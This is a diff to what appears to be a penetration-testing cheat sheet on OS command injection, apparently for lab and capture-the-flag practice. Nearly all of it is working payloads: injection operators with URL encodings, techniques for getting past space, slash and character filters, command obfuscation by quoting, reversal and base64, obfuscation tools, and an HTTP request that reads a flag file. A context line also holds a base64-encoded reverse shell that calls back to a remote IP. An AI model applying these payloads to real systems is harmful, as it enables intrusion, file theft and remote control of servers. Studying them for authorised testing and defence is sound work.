@@ -28,6 +28,23 @@ ls vs dir
 
 <figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Injection Operators Table
+
+| Operator | URL-Encoded | Executed |
+|----------|-------------|----------|
+| `;` | `%3b` | Both |
+| `\n` (newline) | `%0a` | Both |
+| `&` | `%26` | Both (2nd shown first) |
+| `\|` (pipe) | `%7c` | Both (only 2nd output) |
+| `&&` | `%26%26` | Both (only if 1st succeeds) |
+| `\|\|` | `%7c%7c` | 2nd (only if 1st fails) |
+| `` ` `` (backtick) | `%60%60` | Both (Linux only) |
+| `$()` | `%24%28%29` | Both (Linux only) |
+
+**Note:** `;` doesn't work in Windows CMD, but works in PowerShell.
+
+---
+
 ## Non-Blind CMD Inj.
 
 * At the most basic level:
@@ -174,3 +191,215 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg==
 // use this 
 ;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTcvMTIzNCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
 ```
+
+---
+
+## Space Bypass Techniques
+
+| Technique | Example | OS |
+|-----------|---------|-----|
+| Tab | `%09` | Both |
+| `${IFS}` | `cat${IFS}/etc/passwd` | Linux |
+| `$IFS$9` | `cat$IFS$9/etc/passwd` | Linux |
+| Brace Expansion | `{cat,/etc/passwd}` | Linux |
+| `<` redirect | `cat</etc/passwd` | Linux |
+
+---
+
+## Slash (/) Bypass
+
+### Linux - Using Environment Variables
+
+```bash
+# Get / from $PATH
+echo ${PATH:0:1}
+# Output: /
+
+# Full command
+cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+### Windows CMD
+
+```cmd
+# Get \ from %HOMEPATH%
+echo %HOMEPATH:~6,-11%
+```
+
+### Windows PowerShell
+
+```powershell
+$env:HOMEPATH[0]
+$env:PROGRAMFILES[10]
+```
+
+---
+
+## Semicolon (;) Bypass
+
+```bash
+# From LS_COLORS env var
+echo ${LS_COLORS:10:1}
+# Output: ;
+```
+
+---
+
+## Character Shifting (Linux)
+
+```bash
+# Get \ (ASCII 92) by shifting [ (ASCII 91)
+echo $(tr '!-}' '"-~'<<<[)
+```
+
+---
+
+## Command Obfuscation
+
+### Quote Insertion (Linux & Windows)
+
+```bash
+w'h'o'am'i
+w"h"o"am"i
+```
+
+### Linux-Only Characters
+
+```bash
+who$@ami
+w\ho\am\i
+```
+
+### Windows Caret
+
+```cmd
+who^ami
+```
+
+---
+
+## Case Manipulation
+
+### Windows (case insensitive)
+
+```cmd
+WhOaMi
+WHOAMI
+```
+
+### Linux (needs tr)
+
+```bash
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+
+---
+
+## Reversed Commands
+
+### Linux
+
+```bash
+# Reverse string
+echo 'whoami' | rev
+# Output: imaohw
+
+# Execute reversed
+$(rev<<<'imaohw')
+```
+
+### Windows PowerShell
+
+```powershell
+# Reverse
+"whoami"[-1..-20] -join ''
+
+# Execute
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+---
+
+## Base64 Encoded Commands
+
+### Linux
+
+```bash
+# Encode
+echo -n 'cat /etc/passwd' | base64
+
+# Execute (avoid pipe with <<<)
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
+```
+
+### Windows PowerShell
+
+```powershell
+# Encode
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+# Execute
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+### Encode for PowerShell from Linux
+
+```bash
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+```
+
+---
+
+## Obfuscation Tools
+
+### Bashfuscator (Linux)
+
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+
+# Basic usage
+./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd'
+
+# Shorter output
+./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+### DOSfuscation (Windows)
+
+```powershell
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+
+# Inside tool:
+SET COMMAND type C:\flag.txt
+encoding
+1
+```
+
+---
+
+## Newline Bypass
+
+Often not blacklisted - use `%0a`:
+
+```
+127.0.0.1%0awhoami
+```
+
+---
+
+## Example Challenge Payload
+
+```http
+GET /index.php?to=tmp&from=file.txt%09`$(rev<<<'tac')%09${PATH:0:1}flag.txt`&finish=1&move=1 HTTP/1.1
+```
+
+Breakdown:
+- `%09` = tab (space bypass)
+- `$(rev<<<'tac')` = reversed `cat` command
+- `${PATH:0:1}` = `/` character
